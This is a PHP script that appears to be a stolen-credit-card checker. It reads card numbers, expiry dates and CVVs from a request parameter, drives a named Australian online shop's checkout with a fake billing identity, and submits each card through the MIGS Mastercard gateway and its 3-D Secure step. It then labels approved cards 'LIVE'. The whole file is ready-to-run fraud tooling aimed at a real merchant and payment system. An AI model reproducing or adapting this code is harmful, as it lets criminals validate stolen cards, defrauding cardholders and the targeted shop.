<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cock = RandomString();

    $productUrl = "https://bluecitymotorcycles.com.au/product/ktm";

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $productUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $getOten = curl_exec($ch);
    $csrf = GetStr($getOten, '<input name="_token" type="hidden" value="', '"');
    $product_id = GetStr(GetStr($getOten, '<form method="POST" action="'.$productUrl, '</form>'), 'name="product_id" value="', '"');
    $variant_id = GetStr(GetStr($getOten, '<form method="POST" action="'.$productUrl, '</form>'), 'name="variant_id" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://bluecitymotorcycles.com.au/cart/add',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://bluecitymotorcycles.com.au',
            'referer: https://bluecitymotorcycles.com.au/product/ktm-team-logo-sticker-sheet/ktm-team-logo-sticker-sheet',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "_token=$csrf&product_id=$product_id&variant_id=$variant_id&return_route=".urlencode($productUrl)
    ));
    $addCart = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://bluecitymotorcycles.com.au/address/add',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://bluecitymotorcycles.com.au',
            'referer: https://bluecitymotorcycles.com.au/checkout',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "_token=$csrf&billing%5Bfirst_name%5D=As&billing%5Blast_name%5D=Furgeson&billing%5Bphone_number%5D=&billing%5Bmobile_number%5D=1231231234&billing%5Bemail%5D=$cock@gmail.com&billing%5Bstreet%5D=23+Street&billing%5Bstreet_extra%5D=&billing%5Bcountry_id%5D=14&billing%5Bstate_name%5D=NSW&billing%5Bcity%5D=Sydney&billing%5Bzip%5D=2211&same_as_billing=1&shipping%5Bfirst_name%5D=&shipping%5Blast_name%5D=&shipping%5Bphone_number%5D=&shipping%5Bmobile_number%5D=&shipping%5Bemail%5D=&shipping%5Bstreet%5D=&shipping%5Bstreet_extra%5D=&shipping%5Bcountry_id%5D=14&shipping%5Bstate_name%5D=&shipping%5Bcity%5D=&shipping%5Bzip%5D="
    ));
    $addAddress = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://bluecitymotorcycles.com.au/checkout/shipping',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $getShipping = curl_exec($ch);
    $shipping = GetStr(GetStr($getShipping, '<div class="provider__list">', 'PICK UP IN STORE'), 'value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://bluecitymotorcycles.com.au/checkout/payment',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://bluecitymotorcycles.com.au',
            'referer: https://bluecitymotorcycles.com.au/shipping',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "_token=$csrf&shipping_choice=$shipping&user_comment="
    ));
    $paymentIdiot = curl_exec($ch);
    $cart_id = GetStr($paymentIdiot, 'name="cart_id" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://bluecitymotorcycles.com.au/checkout/process/payment',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://bluecitymotorcycles.com.au',
            'referer: https://bluecitymotorcycles.com.au/checkout/payment',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "cart_id=$cart_id&payment_id=1&payment-type=Zip+Pay"
    ));
    $processPanga = curl_exec($ch);
    $stupidlove = GetStr($processPanga, "location: ", "\r\n");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $stupidlove,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $bakaSurajYan = curl_exec($ch);
    $vcpay = GetStr($bakaSurajYan, "Location: ", "\r\n");
    $payment_id = GetStr($vcpay, "paymentId=", "\r\n");
    $session_id = GetStr($vcpay, 'DOID=', '&');

    $cbin = substr($cc, 0,1);
    if($cbin == 5) $cbin = 'Mastercard'; else if($cbin == 4) $cbin = 'Visa'; else if($cbin == 3) $cbin = 'Amex';

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/vpcpay?card=$cbin&gateway=ssl&o=pt&paymentId=$payment_id",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://migs.mastercard.com.au'.$vcpay,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $magnus = curl_exec($ch);
    $session = GetStr($magnus, "Location: ", "\r\n");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au".$session,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://migs.mastercard.com.au'.$vcpay,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $vcpay = curl_exec($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://migs.mastercard.com.au/ssl',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://migs.mastercard.com.au',
            'referer: https://migs.mastercard.com.au/'.$session,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "paymentId=$payment_id&cardno=$cc&cardexpirymonth=$mm&cardexpiryyear=".substr($yy, 2, 4)."&cardsecurecode=$cvv&payButtonImage.x=69&payButtonImage.y=13"
    ));
    $ssl = curl_exec($ch);
    $formshits = GetStr($ssl, '<form', '</form>');
    $pahandlerUrl = GetStr($formshits, 'name="PAReq" action="', '"');
    $paramReq = GetStr($formshits, 'name="PaReq" value="', '"');
    $termUrl = GetStr($formshits, 'name="TermUrl" value="', '"');
    $md = GetStr($formshits, 'name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $pahandlerUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://migs.mastercard.com.au',
            'referer: https://migs.mastercard.com.au/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaReq=".urlencode($paramReq)."&TermUrl=".urlencode($termUrl)."&MD=$md"
    ));
    $pahandler = curl_exec($ch);
    $handlerformshits = GetStr($pahandler, '<form', '</form>');
    $paramRes = GetStr($handlerformshits, 'name="PaRes" value="', '"');
    $pahandlerMD = GetStr($handlerformshits, 'name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/ssl?paymentId=".$payment_id,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://aacsw.3ds.verifiedbyvisa.com',
            'referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($paramRes)."&MD=$pahandlerMD"
    ));
    $migs = curl_exec($ch);
    $timeStamp = GetStr($migs, '&currentTimeStamp=', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/ssl?paymentId=$payment_id&currentTimeStamp=".$timeStamp,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/$cock.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/$cock.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'referer: https://migs.mastercard.com.au/ssl?paymentId='.$payment_id,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $response = urldecode(GetStr($execute, ';URL=', '"'));
    $message = GetStr($response, 'vpc_Message=', '&');
    $cvvResponse = GetStr($response, 'vpc_CSCResultCode=', '&');

    $hinlo = "CSCResultCode = $cvvResponse | Message = $message";

    if (strpos($response, 'vpc_Message=Approved')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$hinlo.'</span></td></tr><br>';

    } elseif ($cvvResponse == "M") {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$hinlo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$hinlo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }
    unlink("$cock.txt");
?>